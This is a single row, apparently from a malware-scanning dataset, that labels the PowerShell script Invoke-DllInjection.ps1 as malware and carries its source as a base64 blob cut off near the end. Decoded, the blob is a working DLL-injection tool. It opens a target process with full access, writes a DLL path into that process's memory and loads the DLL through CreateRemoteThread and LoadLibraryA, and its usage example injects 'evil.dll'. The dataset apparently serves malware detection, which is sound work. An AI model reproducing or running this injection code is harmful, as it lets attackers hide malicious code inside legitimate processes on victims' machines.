Invoke-DllInjection.ps1,29d8aac867e4be3a18f28944025e986b,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLURsbEluamVjdGlvbgp7CjwjCi5TWU5PUFNJUwoKSW5qZWN0cyBhIERsbCBpbnRvIHRoZSBwcm9jZXNzIElEIG9mIHlvdXIgY2hvb3NpbmcuCgpQb3dlclNwbG9pdCBGdW5jdGlvbjogSW52b2tlLURsbEluamVjdGlvbgpBdXRob3I6IE1hdHRoZXcgR3JhZWJlciAoQG1hdHRpZmVzdGF0aW9uKQpMaWNlbnNlOiBCU0QgMy1DbGF1c2UKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lCk9wdGlvbmFsIERlcGVuZGVuY2llczogTm9uZQoKLkRFU0NSSVBUSU9OCgpJbnZva2UtRGxsSW5qZWN0aW9uIGluamVjdHMgYSBEbGwgaW50byBhbiBhcmJpdHJhcnkgcHJvY2Vzcy4KCi5QQVJBTUVURVIgUHJvY2Vzc0lECgpQcm9jZXNzIElEIG9mIHRoZSBwcm9jZXNzIHlvdSB3YW50IHRvIGluamVjdCBhIERsbCBpbnRvLgoKLlBBUkFNRVRFUiBEbGwKCk5hbWUgb2YgdGhlIGRsbCB0byBpbmplY3QuIFRoaXMgY2FuIGJlIGFuIGFic29sdXRlIG9yIHJlbGF0aXZlIHBhdGguCgouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1EbGxJbmplY3Rpb24gLVByb2Nlc3NJRCA0Mjc0IC1EbGwgZXZpbC5kbGwKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkluamVjdCAnZXZpbC5kbGwnIGludG8gcHJvY2VzcyBJRCA0Mjc0LgoKLk5PVEVTCgpVc2UgdGhlICctVmVyYm9zZScgb3B0aW9uIHRvIHByaW50IGRldGFpbGVkIGluZm9ybWF0aW9uLgoKLkxJTksKCmh0dHA6Ly93d3cuZXhwbG9pdC1tb25kYXkuY29tCiM+CgogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICBbSW50XQogICAgICAgICRQcm9jZXNzSUQsCgogICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREbGwKICAgICkKCiAgICAjIENvbmZpcm0gdGhhdCB0aGUgcHJvY2VzcyB5b3Ugd2FudCB0byBpbmplY3QgaW50byBleGlzdHMKICAgIHRyeQogICAgewogICAgICAgIEdldC1Qcm9jZXNzIC1JZCAkUHJvY2Vzc0lEIC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgIH0KICAgIGNhdGNoIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFjdGlvblByZWZlcmVuY2VTdG9wRXhjZXB0aW9uXQogICAgewogICAgICAgIFRocm93ICJQcm9jZXNzIGRvZXMgbm90IGV4aXN0ISIKICAgIH0KICAgIAogICAgIyBDb25maXJtIHRoYXQgdGhlIHBhdGggdG8gdGhlIGRsbCBleGlzdHMKICAgIHRyeQogICAgewogICAgICAgICREbGwgPSAoUmVzb2x2ZS1QYXRoICREbGwgLUVycm9yQWN0aW9uIFN0b3ApLlBhdGgKICAgICAgICBXcml0ZS1WZXJib3NlICJGdWxsIHBhdGggdG8gRGxsOiAkRGxsIgogICAgICAgICRBc2NpaUVuY29kZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcKICAgICAgICAjIFNhdmUgdGhlIG5hbWUgb2YgdGhlIGRsbCBpbiBhbiBhc2NpaS1lbmNvZGVkIGZvcm1hdC4gVGhpcyBuYW1lIHdpbGwgYmUgaW5qZWN0ZWQgaW50byB0aGUgcmVtb3RlIHByb2Nlc3MuCiAgICAgICAgJERsbEJ5dGVBcnJheSA9ICRBc2NpaUVuY29kZXIuR2V0Qnl0ZXMoJERsbCkKICAgIH0KICAgIGNhdGNoIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFjdGlvblByZWZlcmVuY2VTdG9wRXhjZXB0aW9uXQogICAgewogICAgICAgIFRocm93ICJJbnZhbGlkIERsbCBwYXRoISIKICAgIH0KCiAgICBmdW5jdGlvbiBMb2NhbDpHZXQtRGVsZWdhdGVUeXBlCiAgICB7CiAgICAgICAgUGFyYW0KICAgICAgICAoCiAgICAgICAgICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDApXQogICAgICAgICAgICBbVHlwZVtdXQogICAgICAgICAgICAkUGFyYW1ldGVycyA9IChOZXctT2JqZWN0IFR5cGVbXSgwKSksCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEgKV0KICAgICAgICAgICAgW1R5cGVdCiAgICAgICAgICAgICRSZXR1cm5UeXBlID0gW1ZvaWRdCiAgICAgICAgKQoKICAgICAgICAkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KICAgICAgICAkRHluQXNzZW1ibHkgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKQogICAgICAgICRBc3NlbWJseUJ1aWxkZXIgPSAkRG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikKICAgICAgICAkTW9kdWxlQnVpbGRlciA9ICRBc3NlbWJseUJ1aWxkZXIuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQogICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkUGFyYW1ldGVycykKICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICAgICAgICRNZXRob2RCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJFJldHVyblR5cGUsICRQYXJhbWV0ZXJzKQogICAgICAgICRNZXRob2RCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICAgICAgIAogICAgICAgIFdyaXRlLU91dHB1dCAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICB9CgogICAgZnVuY3Rpb24gTG9jYWw6R2V0LVByb2NBZGRyZXNzCiAgICB7CiAgICAgICAgUGFyYW0KICAgICAgICAoCiAgICAgICAgICAgIFtPdXRwdXRUeXBlKFtJbnRQdHJdKV0KICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSApXQogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkTW9kdWxlLAogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSApXQogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkUHJvY2VkdXJlCiAgICAgICAgKQoKICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byBTeXN0ZW0uZGxsIGluIHRoZSBHQUMKICAgICAgICAkU3lzdGVtQXNzZW1ibHkgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1BbmQgJF8uTG9jYXRpb24uU3BsaXQoJ1xcJylbLTFdLkVxdWFscygnU3lzdGVtLmRsbCcpIH0KICAgICAgICAkVW5zYWZlTmF0aXZlTWV0aG9kcyA9ICRTeXN0ZW1Bc3NlbWJseS5HZXRUeXBlKCdNaWNyb3NvZnQuV2luMzIuVW5zYWZlTmF0aXZlTWV0aG9kcycpCiAgICAgICAgIyBHZXQgYSByZWZlcmVuY2UgdG8gdGhlIEdldE1vZHVsZUhhbmRsZSBhbmQgR2V0UHJvY0FkZHJlc3MgbWV0aG9kcwogICAgICAgICRHZXRNb2R1bGVIYW5kbGUgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldE1vZHVsZUhhbmRsZScpCiAgICAgICAgJEdldFByb2NBZGRyZXNzID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRQcm9jQWRkcmVzcycpCiAgICAgICAgIyBHZXQgYSBoYW5kbGUgdG8gdGhlIG1vZHVsZSBzcGVjaWZpZWQKICAgICAgICAkS2VybjMySGFuZGxlID0gJEdldE1vZHVsZUhhbmRsZS5JbnZva2UoJG51bGwsIEAoJE1vZHVsZSkpCiAgICAgICAgJHRtcFB0ciA9IE5ldy1PYmplY3QgSW50UHRyCiAgICAgICAgJEhhbmRsZVJlZiA9IE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigkdG1wUHRyLCAkS2VybjMySGFuZGxlKQogICAgICAgIAogICAgICAgICMgUmV0dXJuIHRoZSBhZGRyZXNzIG9mIHRoZSBmdW5jdGlvbgogICAgICAgIFdyaXRlLU91dHB1dCAkR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRudWxsLCBAKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmXSRIYW5kbGVSZWYsICRQcm9jZWR1cmUpKQogICAgfQoKICAgIGZ1bmN0aW9uIExvY2FsOkdldC1QRUFyY2hpdGVjdHVyZQogICAgewogICAgICAgIFBhcmFtCiAgICAgICAgKAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsCiAgICAgICAgICAgICAgICAgICAgICAgIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRQYXRoCiAgICAgICAgKQogICAgCiAgICAgICAgIyBQYXJzZSBQRSBoZWFkZXIgdG8gc2VlIGlmIGJpbmFyeSB3YXMgY29tcGlsZWQgMzIgb3IgNjQtYml0CiAgICAgICAgJEZpbGVTdHJlYW0gPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5GaWxlU3RyZWFtKCRQYXRoLCBbU3lzdGVtLklPLkZpbGVNb2RlXTo6T3BlbiwgW1N5c3RlbS5JTy5GaWxlQWNjZXNzXTo6UmVhZCkKICAgIAogICAgICAgIFtCeXRlW11dICRNWkhlYWRlciA9IE5ldy1PYmplY3QgQnl0ZVtdKDIpCiAgICAgICAgJEZpbGVTdHJlYW0uUmVhZCgkTVpIZWFkZXIsMCwyKSB8IE91dC1OdWxsCiAgICAKICAgICAgICAkSGVhZGVyID0gW1N5c3RlbS5UZXh0LkFzY2lpRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJE1aSGVhZGVyKQogICAgICAgIGlmICgkSGVhZGVyIC1uZSAnTVonKQogICAgICAgIHsKICAgICAgICAgICAgJEZpbGVTdHJlYW0uQ2xvc2UoKQogICAgICAgICAgICBUaHJvdyAnSW52YWxpZCBQRSBoZWFkZXIuJwogICAgICAgIH0KICAgIAogICAgICAgICMgU2VlayB0byAweDNjIC0gSU1BR0VfRE9TX0hFQURFUi5lX2xmYW5ldyAoaS5lLiBPZmZzZXQgdG8gUEUgSGVhZGVyKQogICAgICAgICRGaWxlU3RyZWFtLlNlZWsoMHgzYywgW1N5c3RlbS5JTy5TZWVrT3JpZ2luXTo6QmVnaW4pIHwgT3V0LU51bGwKICAgIAogICAgICAgIFtCeXRlW11dICRsZmFuZXcgPSBOZXctT2JqZWN0IEJ5dGVbXSg0KQogICAgCiAgICAgICAgIyBSZWFkIG9mZnNldCB0byB0aGUgUEUgSGVhZGVyICh3aWxsIGJlIHJlYWQgaW4gcmV2ZXJzZSkKICAgICAgICAkRmlsZVN0cmVhbS5SZWFkKCRsZmFuZXcsMCw0KSB8IE91dC1OdWxsCiAgICAgICAgJFBFT2Zmc2V0ID0gW0ludF0gKCcweHswfScgLWYgKCggJGxmYW5ld1stMS4uLTRdIHwgJSB7ICRfLlRvU3RyaW5nKCdYMicpIH0gKSAtam9pbiAnJykpCiAgICAKICAgICAgICAjIFNlZWsgdG8gSU1BR0VfRklMRV9IRUFERVIuSU1BR0VfRklMRV9NQUNISU5FCiAgICAgICAgJEZpbGVTdHJlYW0uU2VlaygkUEVPZmZzZXQgKyA0LCBbU3lzdGVtLklPLlNlZWtPcmlnaW5dOjpCZWdpbikgfCBPdXQtTnVsbAogICAgICAgIFtCeXRlW11dICRJTUFHRV9GSUxFX01BQ0hJTkUgPSBOZXctT2JqZWN0IEJ5dGVbXSgyKQogICAgCiAgICAgICAgIyBSZWFkIGNvbXBpbGVkIGFyY2hpdGVjdHVyZQogICAgICAgICRGaWxlU3RyZWFtLlJlYWQoJElNQUdFX0ZJTEVfTUFDSElORSwwLDIpIHwgT3V0LU51bGwKICAgICAgICAkQXJjaGl0ZWN0dXJlID0gJ3swfScgLWYgKCggJElNQUdFX0ZJTEVfTUFDSElORVstMS4uLTJdIHwgJSB7ICRfLlRvU3RyaW5nKCdYMicpIH0gKSAtam9pbiAnJykKICAgICAgICAkRmlsZVN0cmVhbS5DbG9zZSgpCiAgICAKICAgICAgICBpZiAoKCRBcmNoaXRlY3R1cmUgLW5lICcwMTRDJykgLWFuZCAoJEFyY2hpdGVjdHVyZSAtbmUgJzg2NjQnKSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICdJbnZhbGlkIFBFIGhlYWRlciBvciB1bnN1cHBvcnRlZCBhcmNoaXRlY3R1cmUuJwogICAgICAgIH0KICAgIAogICAgICAgIGlmICgkQXJjaGl0ZWN0dXJlIC1lcSAnMDE0QycpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1PdXRwdXQgJ1g4NicKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkQXJjaGl0ZWN0dXJlIC1lcSAnODY2NCcpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1PdXRwdXQgJ1g2NCcKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICdPVEhFUicKICAgICAgICB9CiAgICB9CgogICAgCiAgICAjIEdldCBhZGRyZXNzZXMgb2YgYW5kIGRlY2xhcmUgZGVsZWdhdGVzIGZvciBlc3NlbnRpYWwgV2luMzIgZnVuY3Rpb25zLgogICAgJE9wZW5Qcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgT3BlblByb2Nlc3MKICAgICRPcGVuUHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtVSW50MzJdLCBbQm9vbF0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAkT3BlblByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlblByb2Nlc3NBZGRyLCAkT3BlblByb2Nlc3NEZWxlZ2F0ZSkKICAgICRWaXJ0dWFsQWxsb2NFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvY0V4CiAgICAkVmlydHVhbEFsbG9jRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVaW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICRWaXJ0dWFsQWxsb2NFeCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NFeEFkZHIsICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlKQogICAgJFZpcnR1YWxGcmVlRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsRnJlZUV4CiAgICAkVmlydHVhbEZyZWVFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VpbnQzMl0sIFtVSW50MzJdKSAoW0Jvb2xdKQogICAgJFZpcnR1YWxGcmVlRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEZyZWVFeEFkZHIsICRWaXJ0dWFsRnJlZUV4RGVsZWdhdGUpCiAgICAkV3JpdGVQcm9jZXNzTWVtb3J5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV3JpdGVQcm9jZXNzTWVtb3J5CiAgICAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbQnl0ZVtdXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICRXcml0ZVByb2Nlc3NNZW1vcnkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkV3JpdGVQcm9jZXNzTWVtb3J5QWRkciwgJFdyaXRlUHJvY2Vzc01lbW9yeURlbGVnYXRlKQogICAgJENyZWF0ZVJlbW90ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENyZWF0ZVJlbW90ZVRocmVhZAogICAgJENyZWF0ZVJlbW90ZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENyZWF0ZVJlbW90ZVRocmVhZEFkZHIsICRDcmVhdGVSZW1vdGVUaHJlYWREZWxlZ2F0ZSkKICAgICRDbG9zZUhhbmRsZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENsb3NlSGFuZGxlCiAgICAkQ2xvc2VIYW5kbGVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSkgKFtCb29sXSkKICAgICRDbG9zZUhhbmRsZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDbG9zZUhhbmRsZUFkZHIsICRDbG9zZUhhbmRsZURlbGVnYXRlKQoKICAgICMgQXNzdW1lIENQVSB0byBiZSA2NC1iaXQgdW5sZXNzIGRldGVybWluZWQgb3RoZXJ3aXNlLgogICAgJDY0Yml0Q1BVID0gJFRydWUKICAgIAogICAgIyBEZXRlcm1pbmUgdGhlIGJpdG5lc3Mgb2YgdGhlIHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzIGJhc2VkIHVwb24gdGhlIHNpemUgb2YgdGhlIEludFB0ciB0eXBlLgogICAgaWYgKFtJbnRQdHJdOjpTaXplIC1lcSA0KQogICAgewogICAgICAgICRQb3dlclNoZWxsMzJiaXQgPSAkVHJ1ZQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRQb3dlclNoZWxsMzJiaXQgPSAkRmFsc2UKICAgIH0KCiAgICAjIFRoZSBhZGRyZXNzIGZvciBJc1dvdzY0UHJvY2VzcyB3aWxsIGJlIHJldHVybmVkIGlmIGFuZCBvbmx5IGlmIHJ1bm5pbmcgb24gYSA2NC1iaXQgQ1BVLiBPdGhlcndpc2UsIEdldC1Qcm9jQWRkcmVzcyB3aWxsIHJldHVybiAkbnVsbC4KICAgICRJc1dvdzY0UHJvY2Vzc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIElzV293NjRQcm9jZXNzCgogICAgaWYgKCRJc1dvdzY0UHJvY2Vzc0FkZHIpCiAgICB7CiAgICAJJElzV293NjRQcm9jZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtCb29sXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAJJElzV293NjRQcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJElzV293NjRQcm9jZXNzQWRkciwgJElzV293NjRQcm9jZXNzRGVsZWdhdGUpCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgIyBJc1dvdzY0UHJvY2VzcyBkb2VzIG5vdCBleGlzdCBhbmQgdGh1cywgdGhlIENQVSBpcyBub3QgNjQtYml0LgogICAgCSQ2NGJpdENQVSA9ICRGYWxzZQogICAgfQoKICAgICMgT3BlbiBhIGhhbmRsZSB0byB0aGUgcHJvY2VzcyB5b3Ugd2FudCB0byBpbmplY3QgaW50bwogICAgJGhQcm9jZXNzID0gJE9wZW5Qcm9jZXNzLkludm9rZSgweDAwMUYwRkZGLCAkZmFsc2UsICRQcm9jZXNzSUQpICMgUHJvY2Vzc0FjY2Vzc0ZsYWdzLkFsbCAoMHgwMDFGMEZGRikKCiAgICBpZiAoISRoUHJvY2VzcykKICAgIHsKICAgICAgICBUSHJvdyAnVW5hYmxlIHRvIG9wZW4gcHJvY2VzcyBoYW5kbGUuJwogICAgfQoKICAgICRBcmNoaXRlY3R1cmUgPSBHZXQtUEVBcmNoaXRlY3R1cmUgJERsbAoKICAgIGlmICgkNjRiaXRDUFUpICMgT25seSBwZXJmb3JtIHRoZXNlcyBjaGVja3MgaWYgQ1BVIGlzIDY0LWJpdAogICAgewogICAgICAgIGlmICggKCRBcmNoaXRlY3R1cmUgLW5lICdYODYnKSAtYW5kICgkQXJjaGl0ZWN0dXJlIC1uZSAnWDY0JykgKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgJ09ubHkgeDg2IG9yIEFNRDY0IGFyY2hpdGVjaHR1cmVzIHN1cHBvcnRlZC4nCiAgICAgICAgfQoKICAgICAgICAjIERldGVybWluZSBpcyB0aGUgcHJvY2VzcyBzcGVjaWZpZWQgaXMgMzIgb3IgNjQgYml0LiBBc3N1bWUgdGhhdCBpdCBpcyA2NC1iaXQgdW5sZXNzIGRldGVybWluZWQgb3RoZXJ3aXNlLgogICAgICAgICRJc1dvdzY0ID0gJEZhbHNlCiAgICAgICAgJElzV293NjRQcm9jZXNzLkludm9rZSgkaFByb2Nlc3MsIFtSZWZdICRJc1dvdzY0KSB8IE91dC1OdWxsCgogICAgICAgIGlmICggJFBvd2VyU2hlbGwzMmJpdCAtYW5kICgkQXJjaGl0ZWN0dXJlIC1lcSAnWDY0JykgKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgJ1lvdSBjYW5ub3QgbWFuaXB1bGF0ZSA2NC1iaXQgY29kZSB3aXRoaW4gMzItYml0IFBvd2VyU2hlbGwuIE9wZW4gdGhlIDY0LWJpdCB2ZXJzaW9uIGFuZCB0cnkgYWdhaW4uJwogICAgICAgIH0KCiAgICAgICAgaWYgKCAoISRJc1dvdzY0KSAtYW5kICgkQXJjaGl0ZWN0dXJlIC1lcSAnWDg2JykgKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgJ1lvdSBjYW5ub3QgaW5qZWN0IGEgMzItYml0IERMTCBpbnRvIGEgNjQtYml0IHByb2Nlc3MuJwogICAgICAgIH0KCiAgICAgICAgaWYgKCAkSXNXb3c2NCAtYW5kICgkQXJjaGl0ZWN0dXJlIC1lcSAnWDY0JykgKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgJ1lvdSBjYW5ub3QgaW5qZWN0IGEgNjQtYml0IERMTCBpbnRvIGEgMzItYml0IHByb2Nlc3MuJwogICAgICAgIH0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBpZiAoJEFyY2hpdGVjdHVyZSAtbmUgJ1g4NicpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAnUEUgZmlsZSB3YXMgbm90IGNvbXBpbGVkIGZvciB4ODYuJwogICAgICAgIH0KICAgIH0KCiAgICAjIEdldCBhZGRyZXNzIG9mIExvYWRMaWJyYXJ5QSBmdW5jdGlvbgogICAgJExvYWRMaWJyYXJ5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgTG9hZExpYnJhcnlBCiAgICBXcml0ZS1WZXJib3NlICJMb2FkTGlicmFyeSBhZGRyZXNzOiAweCQoJExvYWRMaWJyYXJ5QWRkci5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgIyBSZXNlcnZlIGFuZCBjb21taXQgbWVtb3J5IHRvIGhvbGQgbmFtZSBvZiBkbGwKICAgICRSZW1vdGVNZW1BZGRyID0gJFZpcnR1YWxBbGxvY0V4Lkludm9rZSgkaFByb2Nlc3MsIFtJbnRQdHJdOjpaZXJvLCAkRGxsLkxlbmd0aCwgMHgzMDAwLCA0KSAjICgweDMwMDAgPSBSZXNlcnZlfENvbW1pdCwgNCA9IFJXKQogICAgaWYgKCRSZW1vdGVNZW1BZGRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgIHsKICAgICAgICBUaHJvdyAnVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiByZW1vdGUgcHJvY2Vzcy4nCiAgICB9CiAgICBXcml0ZS1WZXJib3NlICJETEwgcGF0aCBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRSZW1vdGVNZW1BZGRyLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAjIFdyaXRlIHRoZSBuYW1lIG9mIHRoZSBkbGwgdG8gdGhlIHJlbW90ZSBwcm9jZXNzIGFkZHJlc3Mgc3BhY2UKICAgICRXcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRoUHJvY2VzcywgJFJlbW90ZU1lbUFkZHIsICREbGxCeXRlQXJyYXksICREbGwuTGVuZ3RoLCBbUmVmXSAwKSB8IE91dC1OdWxsCiAgICBXcml0ZS1WZXJib3NlICJEbGwgcGF0aCB3cml0dGVuIHN1Y2Vzc2Z1bGx5LiIKCiAgICAjIEV4ZWN1dGUgZGxsIGFzIGEgcmVtb3RlIHRocmVhZAogICAgJFRocmVhZEhhbmRsZSA9ICRDcmVhdGVSZW1vdGVUaHJlYWQuSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sIDAsICRMb2FkTGlicmFyeUFkZHIsICRSZW1vdGVNZW1BZGRyLCAwLCBbSW50UHRyXTo6WmVybykKICAgIGlmICghJFRocmVhZEhhbmRsZSkKICAgIHsKICAgICAgICBUaHJvdyAnVW5hYmxlIHRvIGxhdW5jaCByZW1vdGUgdGhyZWFkLicKICAgIH0KICAgIAogICAgJFZpcnR1YWxGcmVlRXguSW52b2tlKCRoUHJvY2VzcywgJFJlbW90ZU1lbUFkZHIsICREbGwuTGVuZ3RoLCAweDgwMDApIHwgT3V0LU51bGwgIyBNRU1fUkVMRUFTRSAoMHg4MDAwKQoKICAgICMgQ2xvc2UgcHJvY2VzcyBoYW5kbGUKICAgICRDbG9zZUhhbmRsZS5JbnZva2UoJGhQcm9jZXNzKSB8IE91dC1OdWxsCgogICAgV3JpdGUtVmVyYm9zZSAnRGxsIGluamVjdGlvbiBjb21wbGV0ZSEnCgogICAgIyBFeHRyYWN0IGp1c3QgdGhlIGZpbGVuYW1lIGZyb20gdGhlIHByb3ZpZGVkIHBhdGggdG8gdGhlIGRsbC4KICAgICRGaWxlTmFtZSA9IF